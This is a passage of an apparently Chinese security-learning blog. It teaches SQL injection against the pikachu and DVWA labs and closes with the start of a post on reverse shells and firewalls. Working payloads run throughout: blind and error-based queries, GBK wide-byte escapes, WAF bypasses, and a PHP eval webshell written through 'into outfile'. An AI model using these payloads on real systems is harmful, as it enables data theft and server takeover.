-<p>那么这个时候就是可以通过思考SQL典型的树状结构,一步一步爆出我们想要的东西</p>
-<p>SQL经典结构:   库(schema)–&gt;表(tables)—&gt;字段(column)</p>
-<p>从这些最基本的出发,我们可以逐步摸清并加以利用,实现从边缘信息到重要信息的爬取</p>
-<h4 id="注入思路实践简述"><a href="#注入思路实践简述" class="headerlink" title="注入思路实践简述"></a>注入思路实践简述</h4><p><strong>爆库名</strong>–&gt;<strong>爆表数</strong>–&gt;<strong>爆表名</strong>–&gt;<strong>爆列名</strong>–&gt;<strong>获得用户名和密码</strong></p>
-<p>那么这里开始利用extractvalue()做一些经典的操作(doge)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709192227234.png" alt="image-20240709192227234"></p>
-<h3 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a>updatexml()函数</h3><p>updatexml()是一个使用不同的XML标记匹配和替换XML块的函数</p>
-<p>作用:该百年文档中符合条件的节点的值</p>
-<p>语法:</p>
-<p>update(XML_document, xpath_string, new_value)</p>
-<p>第一个参数;string格式,为XML文档对象的名称</p>
-<p>第二个参数:代表路径,xpath形式的字符串例如&#x2F;title</p>
-<p>第三个参数:string格式,替换查找到的符合条件的数据</p>
-<p>updatexml使用同extractvalue()函数,都是当出现错误时爆出错误信息,并弹出对应的暗示信息,这个就没什么好说的了,直接截图套路即可,自行copy即可(doge)</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709192932960.png" alt="image-20240709192932960"></p>
-<p>其实本质很简单,只是单纯的用两个0x7e占位罢了</p>
-<h2 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>盲注顾名思义,就是一抹黑,无回显无报错的查询.</p>
-<h4 id="1-只能判断是否存在注入和注入的类型"><a href="#1-只能判断是否存在注入和注入的类型" class="headerlink" title="1.只能判断是否存在注入和注入的类型"></a>1.只能判断是否存在注入和注入的类型</h4><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193722352.png" alt="image-20240709193722352"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193749808.png" alt="image-20240709193749808"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193815739.png" alt="image-20240709193815739"></p>
-<p>由图可知,对应的盲注就是像上面这样只有两种反馈信息,要么就是查询到了,要么就是查询不到,那么我们该怎么判断是否成功注入了呢?那么就要推翻我们只能从查询信息和报错信息中汲取攻击面的固有思维,从别的方面深入,一击毙命.</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709194633365.png" alt="image-20240709194633365"></p>
-<p>这里以pikachu靶场中的盲注题型为例,假设一开始我们已知用户vince,想爆出他们的密码</p>
-<table>
-<thead>
-<tr>
-<th align="center">序号</th>
-<th align="center">构造ID取值</th>
-<th align="center">反馈</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">1</td>
-<td align="center">vince</td>
-<td align="center">存在信息回显</td>
-</tr>
-<tr>
-<td align="center">2</td>
-<td align="center">‘</td>
-<td align="center">不存在信息回显</td>
-</tr>
-<tr>
-<td align="center">3</td>
-<td align="center">vince’ and 1&#x3D;1#</td>
-<td align="center">存在信息回显</td>
-</tr>
-<tr>
-<td align="center">4</td>
-<td align="center">vince’ and 1&#x3D;2#</td>
-<td align="center">不存在信息回显</td>
-</tr>
-</tbody></table>
-<p>由条件3和4的构造真假返回对应不同的结果,可知存在SQL注入漏洞</p>
-<p>不过只能知道存在是不够的,要加以利用才是硬道理</p>
-<h4 id="2-猜解当前数据库名称"><a href="#2-猜解当前数据库名称" class="headerlink" title="2.猜解当前数据库名称"></a>2.猜解当前数据库名称</h4><h5 id="1-猜解数据库名称长度-二分法"><a href="#1-猜解数据库名称长度-二分法" class="headerlink" title="1)猜解数据库名称长度(二分法)"></a>1)猜解数据库名称长度(二分法)</h5><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709195523654.png" alt="image-20240709195523654"></p>
-<h5 id="2）判断数据库名称的字符组成元素"><a href="#2）判断数据库名称的字符组成元素" class="headerlink" title="2）判断数据库名称的字符组成元素"></a>2）判断数据库名称的字符组成元素</h5><p>在给定的字符串中利用substr()函数，从指定位置开始截取指定长度的字符串，分离出数据库名称的每个 位置的元素，并分别将其转换为ASCII码，与对应的ASCII码值比较大小，找到比值相同时的字符，然后 逐个击破。</p>
-<p><a href="https://www.sojson.com/asciitable.html">ASCII码对照表|ASCII编码 (sojson.com)</a></p>
-<h5 id="substr的用法"><a href="#substr的用法" class="headerlink" title="substr的用法"></a>substr的用法</h5><p>substr在这里主要用作将字符串中单单一个字符截取出来,后续我们使用ascil函数与二分法逐步迭代出我们需要的数字</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200603601.png" alt="image-20240709200603601"></p>
-<h5 id="猜解数据库中的表名"><a href="#猜解数据库中的表名" class="headerlink" title="猜解数据库中的表名"></a>猜解数据库中的表名</h5><p><strong>猜解表的个数</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200545105.png" alt="image-20240709200545105"></p>
-<p><strong>猜解表名–从长度到具体的字符组成</strong></p>
-<p>这里是猜解长度</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200844644.png" alt="image-20240709200844644"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709201142364.png" alt="image-20240709201142364"></p>
-<p>剩下的字段名字段值不过多赘述,流程是一致的</p>
-<p>最后如果密码有经过某些解密方法那么为只需要重新带回就好了.最后验证一下字段的有效性就可以了</p>
-<p>最后在这里想说的是 手工爆破的工作量是很大的,可以尝试学习python自动化脚本精简掉大部分的内容</p>
-<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>倘若界面返回值只有一种True,无论输入任何值,返回情况都会按正常来处理,加入特定的时间函数,通过查看WEB页面返回的时间差来判断注入的语句是否正确.</p>
-<h4 id="猜解数据库的名称"><a href="#猜解数据库的名称" class="headerlink" title="猜解数据库的名称"></a>猜解数据库的名称</h4><p>其实本质上和布尔盲注的区别就在于, 它将返回信息转化成了响应时间上的区别,若判断条件为真,则执行sleep(n)函数,达到正常响应时间短基础上再延迟相应时间n瞄的效果;若判断条件为假则返回设置的1,此时不执行sleep(n)函数</p>
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and if(length(database())=4,sleep(5),1);#</span><br><span class="line">1&#x27; and if(ascii(substr(database(),1,1))=100,sleep(5),1);#</span><br></pre></td></tr></table></figure>
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>盲注需要这样集中函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">length（） 返回字符串的长度</span><br><span class="line">substr（） 截取字符串</span><br><span class="line">ascil（） 返回字符对应的ASCII码</span><br><span class="line">sleep（） 将程序挂起一段时间</span><br></pre></td></tr></table></figure>
-
-<h2 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h2><p>堆叠注入，从名词的含义就可以看到应该是<strong>一堆 sql 语句（多条）一起执行，而在真实的运用中也是这样的</strong>。我们知道在Mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束，<strong>这样我们就想到了是 不是可以多句一起使用。</strong>其原理也很简单，就是将原来的语句构造完后加上分号，代表该语句结束，后 面再输入的就是一个全新的SQL语句，这个时候使用增删改查毫无限制</p>
-<p>堆叠注入的使用条件是十分有限的,极有可能收到API或者数据库引擎,又或者权限的限制,只有当调用数据库函数支持执行多条SQL语句时才能使用,</p>
-<p>利用mysqli_multi_query()函数就支持多条SQL语句同时执行，但实际情况中，如PHP为了防止所谓的SQL注入机制，调用数据库的函数往往都只是mysqli_query()函数,只能执行一条语句,所以说堆叠注入的使用条件是十分有限的且实战中很少会有这种啥防护器也不上的网页()</p>
-<p>因此SQL注入分类总结可以如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.根据查询字段：数字型，字符型</span><br><span class="line">2.根据查询方式：Union注入、堆叠注入</span><br><span class="line">3.根据回显：报错、盲注</span><br></pre></td></tr></table></figure>
-
-<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入是指存入存出的过程中,存入数据库的时候做了过滤但是去取出来的时候没有做过滤z,而产生的数据库注入.</p>
-<h3 id="插入恶意数据"><a href="#插入恶意数据" class="headerlink" title="插入恶意数据"></a>插入恶意数据</h3><p>在第一次想数据库插入数据时,使用addslashes对其中的特殊字符进行转义,但是addslashes函数有一个特点;虽然参数过滤后添加\进行转义,但是\并不会插入到数据库中,写入时还是保留了原来的数据.</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在MySQL中，反斜线在字符串中属于是转义字符，经过语法解析器解析时会进行一次转义，所以当我们插入反斜线也就是通过insert“\”时，如insert “\”在数据库中只会存储“”，第一个反斜线（\)被当作转义字符处理</span><br></pre></td></tr></table></figure>
-
-<h3 id="引用恶意数据"><a href="#引用恶意数据" class="headerlink" title="引用恶意数据"></a>引用恶意数据</h3><p>在将数据存入到数据库中之后,开发者就认为数据可信了.在下一次进行需要进行查询的时候,直接从数据库中取出了脏数据,没有进行进一步的检验和处理,这样就会造成SQL的二次注入</p>
-<p><strong>比如第一次插入数据的时候,数据中带有单引号,直接插入到了数据库中–然后下一次使用在拼凑的过程中就形成了二次注入.</strong></p>
-<p>二次注入漏洞原理示意图</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709214142033.png" alt="image-20240709214142033"></p>
-<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="宽字节概念"><a href="#宽字节概念" class="headerlink" title="宽字节概念"></a>宽字节概念</h3><p>1、如果一个字符的大小是一个字节的，称为窄字节；</p>
-<p> 2、如果一个字符的大小是两个及以上字节的，称为宽字节； 像GB2312、GBK、GB18030、BIG5、Shift_JIS等编码都是常见的宽字节字符集。 英文默认占一个字节，中文占两个字节。</p>
-<h3 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h3><p>宽字节注入利用给MYSQL的一个特性,利用GBK编码的时候,会认为两个字符是一个汉字,为了防止网站被SQL注入,网站开发人员自然也会做一些防护,最基础的就是对一些特殊字符进行转义</p>
-<p><strong>统筹前面学习的内容,可以发现SQL注入最关键的一步就是让引号闭合和跳出引号,如果无法跳出引号,那么输入的内容就永远在引号里,即永远是字符串,无法实现SQL注入</strong></p>
-<p>网站开发者也想到了这一步,于是他们痛定思痛开始进步,从最简单的一个措施开始做起:<strong>转义</strong>—<strong>对输入的敏感内容、特殊字符进行转换，比方将引号替换为null</strong></p>
-<h4 id="addslashes（）函数"><a href="#addslashes（）函数" class="headerlink" title="addslashes（）函数"></a>addslashes（）函数</h4><p>1、该函数会在预定义字符之前添加反斜线进行转义，<br>2、预定义字符一般有：单引号 双引号 反斜线 null</p>
-<p>所谓的转义就是将预定义字符加上反斜线，使其失去占位构造语句的作用，使预定义字符仅仅是一个普通的字符串</p>
-<p><strong>以pikachu数据库中的member表为例：</strong></p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709220531493.png" alt="image-20240709220531493"></p>
-<p>通过前面的SQL注入实验可以发现，字符型的注入点都是通过单引号闭合前后的反馈来判断的，但遇到addslashes（）函数时，单引号会被转义，导致我们用来判断注入点的单引号失效，所以我们的目的就是使转义符\失效，使单引号逃逸</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1）kobe%df&#x27; or 1=1# //用户在前端输入</span><br><span class="line">2）kobe%df\&#x27; or 1=1# //addslashes()函数对用户输入进行检测，在单引号前面添加转义符</span><br><span class="line">\</span><br><span class="line">kobe%df%5c%27 or 1=1# //转义符 \ 编码成为%5c</span><br><span class="line">%df%5c = 運 //到达数据库，GBK编码</span><br><span class="line">3)kobe運&#x27; or 1=1#</span><br><span class="line">select id,email from member where username=&#x27;kobe運&#x27; or 1=1#&#x27; //从单引号中逃逸出来</span><br></pre></td></tr></table></figure>
-
-<p>[GBK 编码范围, GBK 编码表 (qqxiuzi.cn)](<a href="https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php#:~:text=GBK%E7%BC%96%E7%A0%81%EF%BC%8C%E6%98%AF%E5%AF%B9GB2312%E7%BC%96%E7%A0%81%E7%9A%84%E6%89%A9%E5%B1%95%EF%BC%8C%E5%9B%A0%E6%AD%A4%E5%AE%8C%E5%85%A8%E5%85%BC%E5%AE%B9GB2312-80%E6%A0%87%E5%87%86%E3%80%82,GBK%E7%BC%96%E7%A0%81%E4%BE%9D%E7%84%B6%E9%87%87%E7%94%A8%E5%8F%8C%E5%AD%97%E8%8A%82%E7%BC%96%E7%A0%81%E6%96%B9%E6%A1%88%EF%BC%8C%E5%85%B6%E7%BC%96%E7%A0%81%E8%8C%83%E5%9B%B4%EF%BC%9A8140%EF%BC%8DFEFE%EF%BC%8C%E5%89%94%E9%99%A4xx7F%E7%A0%81%E4%BD%8D%EF%BC%8C%E5%85%B123940%E4%B8%AA%E7%A0%81%E4%BD%8D%E3%80%82">https://www.qqxiuzi.cn/zh/hanzi-gbk-bianma.php#:~:text=GBK编码，是对GB2312编码的扩展，因此完全兼容GB2312-80标准。,GBK编码依然采用双字节编码方案，其编码范围：8140－FEFE，剔除xx7F码位，共23940个码位。</a> 共收录汉字和图形符号21886个，其中汉字（包括部首和构件）21003个，图形符号883个。)</p>
-<p>原理：前端输入 %df%27 时首先经过 addslashes() 函数转义变成了 %df%5c%27 （ %5c 是反斜杠 \ )， 之后在数据库查询前因为设置了GBK编码，即在汉字编码范围内两个字节都会被重新编码为一个汉字。 然后MySQL服务器就会对查询语句进行GBK编码，即 %df%5c 转换成了汉字”運”，使得单引号成功逃 逸，进而实现SQL注入漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%df%27 ===&gt; addslashes函数 ===&gt; %df%5c%27 ===&gt; 数据库GBK ===&gt; 運&#x27;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709224224722.png" alt="image-20240709224224722"></p>
-<h2 id="http-header-和-cookie注入"><a href="#http-header-和-cookie注入" class="headerlink" title="http header 和 cookie注入"></a>http header 和 cookie注入</h2><p>HTTP头注入其实并不是一个新的SQL注入类型,而是指出现SQL注入漏洞的场景,有些时候,后台开发人员为了验证客户端头信息(比如常用的cookie验证),或者通过http header头信息获取客户端的一些资料–比如useragent、acceept字段等，会获取客户端的http header字段内容并用SQL进行处理，如果没有足够的安全检验则会导致对应的SQL注入漏洞。</p>
-<p>进入pikachu的http header来进行一下测试:</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709225102261.png" alt="image-20240709225102261"></p>
-<p>通过提示 ，我们通过基本的admin&#x2F;123456登录，并获得下列信息</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709225244173.png" alt="image-20240709225244173"></p>
-<p>通过登录进去的信息可以猜测，系统后端是不是对http header里面的数据进行了获取，可能也进行了相 关数据库的操作。我们来看一下刚才的抓包，将它发送到Repeater里面，将User-Agent的值删掉，自己 构造一个，还是按照之前的思路，先输入一个单引号：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710101424266.png" alt="image-20240710101424266"></p>
-<p>这个时候发现引发了报错，因此这里基本确定了这里存在http header注入漏洞了，合理猜测数据库使用了insert（）函数进行处理，构造payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;</span><br></pre></td></tr></table></figure>
-
-<p>这里开始解释这个payload</p>
-<h3 id="详细解释"><a href="#详细解释" class="headerlink" title="详细解释"></a>详细解释</h3><h4 id="1-SQL-注入和报错利用"><a href="#1-SQL-注入和报错利用" class="headerlink" title="1. SQL 注入和报错利用"></a>1. SQL 注入和报错利用</h4><p>SQL 注入攻击不仅仅是为了修改或读取数据，还可以通过触发错误来泄露数据库内部信息。通过这种方法，攻击者可以获得数据库的架构信息、版本信息等。</p>
-<h4 id="2-updatexml-函数的使用"><a href="#2-updatexml-函数的使用" class="headerlink" title="2. updatexml 函数的使用"></a>2. <code>updatexml</code> 函数的使用</h4><p><code>updatexml</code> 是一个 MySQL 函数，通常用于处理 XML 数据。当它的参数不合法时，会触发错误消息。攻击者可以利用这一点，将有用的信息嵌入到错误消息中。</p>
-<h4 id="3-报错示例"><a href="#3-报错示例" class="headerlink" title="3. 报错示例"></a>3. 报错示例</h4><p>假设你的 SQL 查询如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sql</span><br><span class="line">复制代码</span><br><span class="line">INSERT INTO logs (user_agent) VALUES (&#x27;&#x27; or updatexml(1,concat(0x7e,database()),0) or &#x27;&#x27;)</span><br></pre></td></tr></table></figure>
-
-<p>其中 <code>updatexml(1,concat(0x7e,database()),0)</code> 部分会触发错误，因为 <code>updatexml</code> 期望的是 XML 文档，但这里传入的是不合法的参数 <code>1</code>。因此，MySQL 会返回一个错误，错误消息中包含了 <code>concat(0x7e,database())</code> 的结果。</p>
-<h3 id="触发错误和提取信息"><a href="#触发错误和提取信息" class="headerlink" title="触发错误和提取信息"></a>触发错误和提取信息</h3><p>当上述 SQL 查询执行时，由于 <code>updatexml</code> 函数的参数不合法，MySQL 会生成错误消息。错误消息中将包含 <code>concat(0x7e,database())</code> 的结果，其中 <code>0x7e</code> 是 ASCII 码 <code>~</code>，而 <code>database()</code> 函数返回当前数据库的名称。</p>
-<p>错误消息可能类似于：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">复制代码</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &#x27;~current_database_name&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>在这种情况下，错误消息泄露了当前数据库的名称 <code>current_database_name</code>。</p>
-<h3 id="为什么需要or"><a href="#为什么需要or" class="headerlink" title="为什么需要or"></a>为什么需要<code>or</code></h3><p><code>or</code>在这里的主要作用是确保注入的代码在逻辑上总是会被评估并执行。即使前面的条件为假（例如空字符串），<code>or</code>会导致SQL引擎继续评估后面的条件。在这个特定的payload中，<code>updatexml</code>函数被设计为引发错误，从而泄露数据库名称。</p>
-<h1 id="从MYSQL注入到GetShell"><a href="#从MYSQL注入到GetShell" class="headerlink" title="从MYSQL注入到GetShell"></a>从MYSQL注入到GetShell</h1><p>Mysql支持向外写文件,这里的外指的是服务器的外部,需要用到</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">into</span> outfile</span><br></pre></td></tr></table></figure>
-
-<p>这个命令的作用是将被选择的一行代码写入一个文件中,文件被创建到服务器上,</p>
-<p><strong>其中 select into outfile的使用前提是</strong></p>
-<p>(1)要知道网站的绝对路径,可以通过开源程序,报错,phpinfo,404页面等一些方式做基本的信息收集</p>
-<p>(2)对目录要有写权限,一般image之类的存放图片的目录y欧写入权限</p>
-<p>(3)要有mysql file权限,即(能否对系统的文件读取和写操作),默认情况下只有root权限有, <strong>WARING:写的文件名一定是在网站中不存在的,不然会失败</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1,&quot;&lt;?php eval($_POST[&#x27;a&#x27;]);?&gt;&quot; into outfile &#x27;/var/www/html/shell2.php</span><br></pre></td></tr></table></figure>
-
-<p>在DVWA Low等级的SQL injection中如此输入,后续访问对应的网站目录,可以发现成功注入,并通过蚁剑弹shell</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710103522276.png" alt="image-20240710103522276"></p>
-<h1 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h1><p>绕过的姿势很多,这里介绍几种</p>
-<h2 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h2><p>用于只针对于小写或大写的关键字匹配技术,正则表达式&#x2F;express&#x2F;i 表达大小写不敏感,即无法绕过,这是最简单的绕过方式</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</span><br></pre></td></tr></table></figure>
-
-<h2 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h2><p>一般情况下大小写转换无法绕过,而且正则表达式会替换或山粗和select,union这些比较危险的关键字,如果只匹配一次–(也就是不做二次校验,只删去一层危险关键字便通过用户的操作)–只需要<strong>双写关键字</strong>就很容易绕过</p>
-<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">举例：z.com<span class="operator">/</span>index.php?page_id<span class="operator">=</span><span class="number">-15</span> UNIunionON SELselectECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="使用编码"><a href="#使用编码" class="headerlink" title="使用编码"></a>使用编码</h2><h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>在浏览器中输入一个连接,浏览器会对非保留字符进行URL编码</p>
-<p>空格-%20</p>
-<p>单引号-%27</p>
-<p>左右括号分别是%28 %29</p>
-<p><strong>普通的URL编码可能无法实现绕过，需要结合实际场景来判断</strong></p>
-<p><strong>比方说URL编码只进行了一次过滤，就可以再编码一次双重编码绕过</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1%2527id=1%252f%252a*/UNION%252f%252a%252a/SELECT</span><br></pre></td></tr></table></figure>
-
-<p>首先，我们需要理解URL编码。<code>%25</code>是<code>%</code>的URL编码。因此，<code>%2527</code>解码后是<code>%27</code>，<code>%252f</code>解码后是<code>%2f</code>，<code>%252a</code>解码后是<code>%2a</code>。</p>
-<h3 id="解码后的payload"><a href="#解码后的payload" class="headerlink" title="解码后的payload"></a>解码后的payload</h3><p>通过一次URL解码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">plaintext</span><br><span class="line">复制代码</span><br><span class="line">1%27id=1%2f%2a*/UNION%2f%2a%2a/SELECT</span><br></pre></td></tr></table></figure>
-
-<p>再次URL解码后：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;id=1/*/UNION/**/SELECT</span><br></pre></td></tr></table></figure>
-
-<h3 id="详细解析"><a href="#详细解析" class="headerlink" title="详细解析"></a>详细解析</h3><ol>
-<li>**<code>1&#39;</code>**：这是一个单引号，通常用于结束字符串字面值，打开可能的SQL注入点。</li>
-<li>**<code>id=1</code>**：这是一个常规的条件部分，可能是为了符合预期的SQL查询语法。</li>
-<li>**<code>/\*/UNION/\**/SELECT</code>**：这是注入的主要部分，其中使用了SQL注释语法<code>/* ... */</code>来插入注释。</li>
-</ol>
-<h3 id="绕过防护机制"><a href="#绕过防护机制" class="headerlink" title="绕过防护机制"></a>绕过防护机制</h3><ol>
-<li><p><strong>注释绕过</strong></p>
-<p><code>/*</code>和<code>*/</code>是SQL中的多行注释符号。攻击者利用这些注释符号来分割注入的关键字，使得简单的防护机制难以检测到关键字（如<code>UNION</code>和<code>SELECT</code>）的完整匹配。</p>
-<p>在这个例子中：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*/UNION/**/SELECT</span><br></pre></td></tr></table></figure>
-
-<p>这实际上是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ UNION / SELECT</span><br></pre></td></tr></table></figure>
-
-<p>由于注释的存在，防护机制可能无法检测到完整的<code>UNION SELECT</code>关键字，从而绕过防护。</p>
-</li>
-</ol>
-<h3 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h3><p>顾名思义用16进制转义</p>
-<h2 id="注释绕过"><a href="#注释绕过" class="headerlink" title="注释绕过"></a>注释绕过</h2><h2 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710104600689.png" alt="image-20240710104600689"></h2><h2 id="等价函数与命令"><a href="#等价函数与命令" class="headerlink" title="等价函数与命令"></a>等价函数与命令</h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710105238466.png" alt="image-20240710105238466"></p>
-<h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240710105608748.png" alt="image-20240710105608748"></p>
-]]></content>
-      <categories>
-        <category>Application vulnerabilities</category>
-      </categories>
-      <tags>
-        <tag>OWASP</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>从0开始的渗透Day1-3desu</title>
-    <url>/2024/07/11/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h1 id="如读者有未授权渗透行为，后果自负，本站仅作学习用途"><a href="#如读者有未授权渗透行为，后果自负，本站仅作学习用途" class="headerlink" title="如读者有未授权渗透行为，后果自负，本站仅作学习用途"></a>如读者有未授权渗透行为，后果自负，本站仅作学习用途</h1><h1 id="Day1-基础入门-操作系统-名词-文件下载-反弹shell-防火墙绕过"><a href="#Day1-基础入门-操作系统-名词-文件下载-反弹shell-防火墙绕过" class="headerlink" title="Day1:基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹shell&amp;防火墙绕过"></a>Day1:基础入门-操作系统&amp;名词&amp;文件下载&amp;反弹shell&amp;防火墙绕过</h1><h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><p><a href="https://www.cnblogs.com/sunny11/p/13583083.html">https://www.cnblogs.com/sunny11/p/13583083.html</a></p>
-<h1 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h1><p><a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a></p>
-<p><strong>在渗透的过程中，如果我们要在对方的服务里面下载我们制作好的病毒文件等，是不可能通过打开对方的浏览器进而进行下载的，因此弹出shell后我们也要掌握一些基本的文件下载命令，并且自己搭建一个小型的渗透站点用于传输一些安全脚本或者安全文件作为攻击手段。</strong></p>
-<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>反弹shell主要用于<strong>命令发送后无回显的情况</strong>，<strong>大部分 的安全工具都是一条命令发送过后便了无音讯</strong>，服务器接收了但并没有给我们对应的反馈，这个时候就需要反弹shell。</p>
-<p>同时反弹shell能够解决一些需要交互式问答的命令的执行问题，一般情况下<strong>webshell是无法进一步验证我们的命令的</strong>，如果我们需要进行一些高权限的操作，这时服务器要求我们验证root权限，即使我们有root密码也是无济于事的，<strong>因为交互式命令的进一步交互并没有反馈到所谓的webshell这里</strong>，这个时候就更需要反弹shell了</p>
-<h1 id="防火墙绕过"><a href="#防火墙绕过" class="headerlink" title="防火墙绕过"></a>防火墙绕过</h1><p>案例</p>
-<h2 id="1-内网："><a href="#1-内网：" class="headerlink" title="1.内网："></a>1.内网：</h2><p>内网**–&gt;**xzb666-hub</p>
-<p>xzb666-hub**!–&gt;**内网</p>
-<p>这里的xzb666-hub可以代指类似本博客这样部署在公网上的站点</p>
-<p>这块的监听可以用nc做实验，分别以xzb666-hub为代表的公网以及以虚拟机为代表的内网作为被监听端和监听端</p>
-<p>发现此时监听成立，能够弹shell</p>
-<p>但反过来，以xzb666-hubd为代表的公网想要监听内网是不成立的</p>
-<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/008jCdW0gy1hriyt8rqkwj30xd0xinbv.jpg" alt="img"></p>
-<p>那么这就是一个很生草的问题了</p>
-<p>下面我们来解释下这个问题</p>
-<p>内网能够主动找到外网地址，但外网地址想要找内网地址却很难，下面扒取一段解释，可以作为参考</p>
-<ol>
-<li><p><strong>内网可以直接访问外网么？</strong></p>
-<p>答案是<code>不能</code>，内网IP访问外网必须要通过路由器来中转 ，路由器只有连上了电信服务器，分配有外网IP才能访问外网。但内网通过路由器的中继是可以精准找到外网的。</p>
-</li>
-<li><p><strong>外网能否访问内网？</strong></p>
-<p>答案是外网设备不能直接访问内网设备。这是因为内网（局域网）和外网（广域网）之间存在一个隔离层，通常由路由器或防火墙来维持。这种隔离是为了保护内网设备不受外部攻击和未经授权的访问</p>
-<p>————————————————————————————————————</p>
-<ol>
-<li><strong>NAT（网络地址转换）</strong>：路由器通常使用NAT技术，将内网IP地址转换为外网IP地址。外部设备无法直接访问内网IP，因为这些IP在外网中是不可见的。</li>
-<li><strong>防火墙</strong>：路由器或专用防火墙通常会阻止外部未授权的访问请求进入内网，以保护内网设备的安全。</li>
-</ol>
